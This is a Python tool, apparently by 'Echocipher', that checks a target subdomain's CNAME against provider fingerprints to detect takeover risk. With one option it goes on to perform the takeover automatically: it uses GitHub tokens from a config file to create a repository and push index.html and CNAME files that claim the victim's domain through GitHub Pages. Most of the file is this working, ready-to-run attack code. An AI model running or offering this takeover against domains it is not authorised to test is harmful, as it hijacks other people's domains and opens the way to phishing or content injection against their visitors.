# encoding: utf-8
import json
import requests
import dns.resolver
import sys,getopt
import yaml
import os
import base64

HEADERS = {
    "Accept":"application/json, text/javascript, */*; q=0.01",
    "Accept-Language":"zh-CN,zh;q=0.9",
    "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
}

# 指纹读取
def providers_read():
    try:
        with open('providers.json','r') as f:
            str_json = f.read()
            json_dicts = json.loads(str_json)
            return json_dicts
    except:
        print('[*] Wrong! 请检查是否存在providers.json文件')

# 获取cname记录
def cname_get(url):
    try:
        cn = dns.resolver.query(url,'CNAME')
        for rrset in cn.response.answer:
            for cname in rrset.items:
                return (cname.to_text())
    except: #不存在cname解析，pass
        pass

# 接管检测
def sub_check(cname,subdomain):
    print('[*]Testing in progress...')
    json_dicts = providers_read()
    for json_dict in json_dicts:
        fingerprint_lists = json_dict['response']
        cname_lists = json_dict['cname']
        for provider in cname_lists:
            try:
                if provider in cname:
                    url = 'http://' + cname
                    status_code = url_get(url)[0]
                    response_text = url_get(url)[1]
                    if status_code == 404:
                        print('[+]vulns:' + subdomain + ',cname:' + cname)
                    elif status_code == 200:
                        for fingerprint_str in fingerprint_lists:
                            if fingerprint_str in response_text:
                                print('[+]vulns:' + subdomain + ',cname:' + cname)
                            else:
                                break
                else:
                    pass
            except:
                pass

# Github接管文件生成
def uplod_git(repo_name,CHECK_HEADERS,token,url,user):
    html = b'''
    <html>
        <p>Subdomain Takerover Test!</>
        <p>from subdomain_takeover</p>
    </html>
    '''
    url = bytes(url,encoding='utf-8')
    html64 = base64.b64encode(html).decode('utf-8')
    url64 = base64.b64encode(url).decode('utf-8')
    # index.html文件
    html_dict = {
           "message": "my commit message",
           "committer": {
             "name": "user",
             "email": "user@163.com"
           },
           "content": html64
        }
    # CNAME文件
    url_dict = {
           "message": "my commit message",
           "committer": {
             "name": "user",
             "email": "user@163.com"
           },
           "content": url64
        }
    html_url = 'https://api.github.com/repos/' + user + '/' + repo_name + '/contents/index.html'
    url_url = 'https://api.github.com/repos/' + user + '/' + repo_name + '/contents/CNAME'
    html_r = requests.put(url=html_url,data=json.dumps(html_dict), headers=CHECK_HEADERS)
    cname_r = requests.put(url=url_url,data=json.dumps(url_dict), headers=CHECK_HEADERS)
    rs=cname_r.status_code
    if rs==201:
        print('[+]自动接管成功，请访问http://'+str(url,'utf-8')+'查看结果')
    else:
        print('[+]自动接管失败，请检查网络或稍后重试...')

# 自动接管文件更新
def update_git(repo_name,CHECK_HEADERS,token,url,user):
    sha_url = "https://api.github.com/repos/"+user+"/"+repo_name+"/contents/CNAME"
    # 获取文件sha值
    sha_r = requests.get(url=sha_url,headers=CHECK_HEADERS)
    if sha_r.status_code == 200:
        sha = json.loads(sha_r.text)['sha']
    else:
        sha=''
    url = bytes(url,encoding='utf-8')
    url64 = base64.b64encode(url).decode('utf-8')
    CNAME_dict={
      "message": "my commit message update",
      "committer": {
        "name": "user",
        "email": "user@163.com"
      },
      "content": url64,
      "sha":sha
    }

    r = requests.put(url=sha_url,data=json.dumps(CNAME_dict), headers=CHECK_HEADERS)
    if r.status_code == 200:
        print('[+]自动接管成功，请访问http://'+str(url,'utf-8')+'查看结果')
    else:
        print('[+]自动接管失败，请检查网络或稍后重试...')


# 检查是否可以自动接管
def auto_take(url,cname):
    with open ('config.yml') as stream:
        data = yaml.load(stream,Loader=yaml.FullLoader)
        repo_name = data['Repo'][0]['name']
        print('[*]正在读取配置文件...')
        for prov in data['tokens']:
            user = prov['user']
            token = prov['token']
            CHECK_HEADERS = {
            "Authorization": 'token '+ token,
            "Accept": "application/vnd.github.baptiste-preview+json"
            }
            # 如果判断到是Github服务，自动上传文件
            if 'github' in cname:
                print('[*]正在开启Github自动接管模块...')
                print('[*]正在验证是否存在用于接管的库...')
                repos_url = 'https://api.github.com/repos/'+ user +'/' + repo_name
                repos_r = requests.get(url=repos_url,headers=CHECK_HEADERS)
                # 判断Token是否正确、是否已经存在库，若有直接更新，否则创建
                if 'message' in repos_r.json():
                    if repos_r.json()['message'] == 'Bad credentials':
                        print('[*]请检查Token是否正确')
                        sys.exit(2)
                    elif repos_r.json()['message'] == 'Not Found':
                        print('[*]未检测到接管库，正在自动生成...')
                        creat_repo_dict = {
                              "name": repo_name,
                              "description": "This is a subdomain takeover Repository",
                              "auto_init": True
                            }
                        creat_repo_url = 'https://api.github.com/user/repos'
                        creat_repo_r = requests.post(url=creat_repo_url,headers=CHECK_HEADERS,data=json.dumps(creat_repo_dict))
                        creat_repo_status = creat_repo_r.status_code
                        if creat_repo_status == 201:
                            print('[*]创建接管库' + repo_name + '成功，正在进行自动接管...' )
                            uplod_git(repo_name,CHECK_HEADERS,token,url,user)
                            print('[*]首次创建接管库请访问https://github.com/'+ user + '/'+repo_name+'/settings将Github Pages的source选项设置为master branch')
                else: 
                    if repos_r.json()['name'] == repo_name:
                        print('[*]接管库' + repo_name + '已存在，正在进行自动接管...' )
                        update_git(repo_name,CHECK_HEADERS,token,url,user)

                    else:
                        print('[*]Incredible mistakes')
                        sys.exit(2)


# 发起请求
def url_get(url):
    r = requests.get(url,HEADERS,timeout=5)
    status_code = r.status_code
    response_text = r.content.decode('utf-8')
    return status_code,response_text

def main(argv):
    print('''
        
.▄▄ · ▄• ▄▌▄▄▄▄· ·▄▄▄▄       • ▌ ▄ ·.  ▄▄▄· ▪   ▐ ▄     ▄▄▄▄▄ ▄▄▄· ▄ •▄ ▄▄▄ .       ▌ ▐·▄▄▄ .▄▄▄  
▐█ ▀. █▪██▌▐█ ▀█▪██▪ ██▪     ·██ ▐███▪▐█ ▀█ ██ •█▌▐█    •██  ▐█ ▀█ █▌▄▌▪▀▄.▀·▪     ▪█·█▌▀▄.▀·▀▄ █·
▄▀▀▀█▄█▌▐█▌▐█▀▀█▄▐█· ▐█▌▄█▀▄ ▐█ ▌▐▌▐█·▄█▀▀█ ▐█·▐█▐▐▌     ▐█.▪▄█▀▀█ ▐▀▀▄·▐▀▀▪▄ ▄█▀▄ ▐█▐█•▐▀▀▪▄▐▀▀▄ 
▐█▄▪▐█▐█▄█▌██▄▪▐███. ██▐█▌.▐▌██ ██▌▐█▌▐█ ▪▐▌▐█▌██▐█▌     ▐█▌·▐█ ▪▐▌▐█.█▌▐█▄▄▌▐█▌.▐▌ ███ ▐█▄▄▌▐█•█▌
 ▀▀▀▀  ▀▀▀ ·▀▀▀▀ ▀▀▀▀▀• ▀█▄▀▪▀▀  █▪▀▀▀ ▀  ▀ ▀▀▀▀▀ █▪     ▀▀▀  ▀  ▀ ·▀  ▀ ▀▀▀  ▀█▄▀▪. ▀   ▀▀▀ .▀  ▀
                                       
                                        author:Echocipher

                          A small program to detect subdomain takeover

                                                                                                          
        ''')
    try:
        opts,args = getopt.getopt(argv,'hu:c:')
    except:
        print('[*]Usage:python subdomain_takeover.py -u <target>')
        print('[*]Usage:python subdomain_takeover.py -u <target> -c True')
        sys.exit(2)
    for opt,arg in opts:
        if opt == '-h':
            print('[*]Usage:python subdomain_takeover.py -u <target>')
            print('[*]Usage:python subdomain_takeover.py -u <target> -c True')
            sys.exit()
        elif opt == '-u':
            subdomain = arg
            cname = cname_get(subdomain)
            sub_check(cname,subdomain)
        elif opt == '-c':
            if arg == 'True':
                auto_take(subdomain,cname)
            else:
                print('[*]Usage:python subdomain_takeover.py -u <target>')
                print('[*]Usage:python subdomain_takeover.py -u <target> -c True')
                sys.exit(2)

if __name__ == '__main__':
    main(sys.argv[1:])
